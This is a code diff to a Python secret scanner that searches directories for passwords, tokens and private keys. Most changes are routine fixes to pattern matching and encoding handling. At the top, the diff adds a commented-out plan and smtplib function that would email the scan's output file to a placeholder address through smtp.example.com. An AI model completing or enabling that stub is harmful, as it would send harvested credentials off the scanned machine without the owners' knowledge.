@@ -7,12 +7,50 @@
 # The scanner attempts to reduce false positives by ignoring placeholders,
 # environment-variable references, symbolic identifiers, and common code expressions.
 
+# NOTE: I can later use networking code (rquests, socket, smtplib, etc.) to transmit the data
+# Options include TCP, smtplib, and sending to a server. To use smtplib (email to me)...do this:
+# import smtplib
+# from email.message import EmailMessage
 
+ #def send_file(filename):
+    #sender_email = os.environ["SENDER_EMAIL"]
+    #sender_password = os.environ["EMAIL_PASSWORD"]
+    #receiver_email = "your_email@example.com"
+    #msg = EmailMessage()
+    #msg["Subject"] = "Python Program Output"
+    #msg["From"] = sender_email
+    #msg["To"] = receiver_email
+
+    #msg.set_content("The output file from the Python program is attached.")
+
+    # Attach the text file
+    #with open(filename, "rb") as file:
+    #    file_data = file.read()
+
+    #msg.add_attachment(file_data, maintype="text", subtype="plain", filename=filename)
+    # Replace with your email provider's SMTP server
+    #smtp_server = "smtp.example.com"
+    #smtp_port = 587
+
+    #with smtplib.SMTP(smtp_server, smtp_port) as server:
+        #server.starttls()
+
+        #server.login(
+        #    sender_email,
+        #    sender_password
+        #server.send_message(msg)
+
+    #print("File successfully emailed.")
+
+
+#send_file("output.txt")
 
 from pathlib import Path
 import re
 import ctypes
 import sys
+import os
+import codecs
 
 # -----------------------------
 # Configuration
@@ -179,8 +217,8 @@ PLACEHOLDER_PATTERNS = [
     r"^sample[_-]",
     r"^dummy[_-]",
     r"^(?:[A-Za-z][A-Za-z0-9]*[_-])?x{8,}$",
-    r"^variable\d+$",
-    r"^string\d+$",
+    r"^variable-\d+$",
+    r"^string-\d+$",
 ]
 PLACEHOLDER_PATTERNS = [
     re.compile(pattern, re.IGNORECASE)
@@ -188,7 +226,13 @@ PLACEHOLDER_PATTERNS = [
 ]
 
 # Common language/type identifiers that can appear near credential-like names but are not secrets.
-MIN_SECRET_LENGTH = 8
+DEFAULT_MIN_SECRET_LENGTH = 8
+
+MIN_SECRET_LENGTH_BY_TYPE = {
+    "password": 1,
+    "passwd": 1,
+    "pwd": 1,
+}
 
 # Common programming-language/type words that frequently appear after a
 # credential-looking name but are not credential values.
@@ -199,7 +243,9 @@ NON_SECRET_WORDS = {
     "settings", "data", "result", "response", "request", "pwr", 
     "instagram", "pass:insta", "$insta::secret",
     "search-result", "response?.password", "operator", "variable", "string",
-    "invalid refresh token"
+    "invalid refresh token", "$dir/private/cakey.pem", "$(python3", "selected",
+    "trim$1(tokens[i", "[keyword", "diff-add-inner","diff-delete-inner", "token",
+    "Co-Authored-By", "files"
 }
 
 IDENTIFIER_PATTERN = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
@@ -283,10 +329,15 @@ SECRET_PATTERN = re.compile(
         )
         \s*
         (?:
-            (?P<value_quote>["'])
-            (?P<quoted_value>[^"'\r\n]*)
-            (?P=value_quote)
+            "
+            (?P<double_quoted_value>(?:\\.|[^"\\\r\n])*)
+            "
             |
+            '
+            (?P<single_quoted_value>(?:\\.|[^'\\\r\n])*)
+            '
+            |
+            (?!["'])
             (?P<bare_value>[^\s,}\];#]+)
         )
     """,
@@ -367,12 +418,6 @@ def should_scan_file(path):
     else:
         return False
 
-# Return True if any part of a path belongs to an excluded directory.        
-def is_excluded_path(path):
-    return any(
-        part.lower() in EXCLUDED_DIRECTORIES
-        for part in path.parts
-    )
 
 # Return True if a path is the scanner itself or its generated results file.
 def is_scanner_file(path):
@@ -528,10 +573,25 @@ def looks_like_code_expression(value):
     else:
         return False
 
+# Get the minimum length that a secret can be based on credential type
+def get_min_secret_length(credential_type):
+    normalized_type = (
+        credential_type
+        .lower()
+        .replace("_", "")
+        .replace("-", "")
+    )
+
+    return MIN_SECRET_LENGTH_BY_TYPE.get(
+        normalized_type,
+        DEFAULT_MIN_SECRET_LENGTH
+    )
+
 # Return True if a credential-like match should be ignored as a likely false positive.
 def is_false_positive(
     value,
     *,
+    credential_type=None,
     path=None,
     is_quoted=False,
     key_quoted=False,
@@ -555,7 +615,13 @@ def is_false_positive(
 
     # Gets rid of one-character matches, short variable names such as pwr,
     # short type names such as str, and other tiny fragments.
-    if len(cleaned) < MIN_SECRET_LENGTH:
+    minimum_length = (
+        get_min_secret_length(credential_type)
+        if credential_type
+        else DEFAULT_MIN_SECRET_LENGTH
+    )
+        
+    if len(cleaned) < minimum_length:
         return True
 
     if lowered in NON_SECRET_WORDS:
@@ -611,17 +677,27 @@ def scan_line(path, line_num, line):
 
     for match in SECRET_PATTERN.finditer(line):
         credential_type = match.group("credential_type")
-        credential_value = (
-            match.group("quoted_value")
-            if match.group("quoted_value") is not None
-            else match.group("bare_value")
-        )
-        is_quoted = match.group("value_quote") is not None
+        
+        double_quoted_value = match.group("double_quoted_value")
+        single_quoted_value = match.group("single_quoted_value")
+        bare_value = match.group("bare_value")
+
+        if double_quoted_value is not None:
+            credential_value = double_quoted_value
+            is_quoted = True
+        elif single_quoted_value is not None:
+            credential_value = single_quoted_value
+            is_quoted = True
+        else:
+            credential_value = bare_value
+            is_quoted = False
+
         key_quoted = bool(match.group("key_quote"))
         operator = match.group("operator")
             
         if is_false_positive(
             credential_value,
+            credential_type=credential_type,
             path=path,
             is_quoted=is_quoted,
             key_quoted=key_quoted,
@@ -639,18 +715,61 @@ def scan_line(path, line_num, line):
         
     return findings     
 
+
+def detect_text_encoding(path):
+    with path.open("rb") as file:
+        sample = file.read(4096)
+
+    # UTF-8 with BOM
+    if sample.startswith(codecs.BOM_UTF8):
+        return "utf-8-sig"
+
+    # Check UTF-32 before UTF-16 because some BOM prefixes overlap.
+    if sample.startswith(
+        (codecs.BOM_UTF32_LE, codecs.BOM_UTF32_BE)
+    ):
+        return "utf-32"
+
+    # UTF-16 with BOM
+    if sample.startswith(
+        (codecs.BOM_UTF16_LE, codecs.BOM_UTF16_BE)
+    ):
+        return "utf-16"
+
+    # Try to recognize UTF-16 without a BOM.
+    even_bytes = sample[0::2]
+    odd_bytes = sample[1::2]
+
+    if even_bytes and odd_bytes:
+        even_null_ratio = even_bytes.count(0) / len(even_bytes)
+        odd_null_ratio = odd_bytes.count(0) / len(odd_bytes)
+
+        # ASCII-like UTF-16 LE usually has null bytes
+        # in the odd byte positions.
+        if odd_null_ratio > 0.30 and even_null_ratio < 0.05:
+            return "utf-16-le"
+
+        # ASCII-like UTF-16 BE usually has null bytes
+        # in the even byte positions.
+        if even_null_ratio > 0.30 and odd_null_ratio < 0.05:
+            return "utf-16-be"
+
+    # Most source/configuration files will be UTF-8.
+    return "utf-8"
+
+
 # Scan a text file line by line and return all credential findings from that file.
 def scan_file(path):
     findings = []
     private_key_lines = []
     private_key_start_line = None
     try:
+        encoding = detect_text_encoding(path)
         with path.open(
             "r",
-            encoding="utf-8",
-            errors="ignore"
+            encoding=encoding,
+            errors="replace"
         ) as file:
-
             for line_num, line in enumerate(file, 1):
                 if private_key_lines:
                     private_key_lines.append(line.rstrip("\n"))
@@ -665,6 +784,9 @@ def scan_file(path):
                     private_key_lines = [line.rstrip("\n")]
                     continue
                 findings.extend(scan_line(path, line_num, line))
+            if private_key_lines:
+                incomplete_private_key = "\n".join(private_key_lines)
+                record_finding(findings, path, private_key_start_line, "incomplete_private_key", incomplete_private_key)
             
     except PermissionError:
         pass
@@ -676,22 +798,29 @@ def scan_file(path):
 # Recursively scan eligible files below root and return all detected credential findings.
 def scan_directory(root):
     findings = []
-    for path in root.rglob("*"):
 
-        if is_excluded_path(path):
-            continue
-        if not path.is_file():
-            continue
-        if is_scanner_file(path):
-            continue
+    for current_root, dirs, files in os.walk(root):
+        # Prevent os.walk from entering excluded directories.
+        dirs[:] = [
+            directory
+            for directory in dirs
+            if directory.lower() not in EXCLUDED_DIRECTORIES
+        ]
 
-        if is_interesting_file(path):
-            print(f"[Interesting file] - {path}")
+        for filename in files:
+            path = Path(current_root) / filename
 
-        if not should_scan_file(path):
-            continue
+            if is_scanner_file(path):
+                continue
 
-        findings.extend(scan_file(path))
+            if is_interesting_file(path):
+                print(f"[Interesting file] - {path}")
+
+            if not should_scan_file(path):
+                continue
+
+            findings.extend(scan_file(path))
+
     return findings
 
 
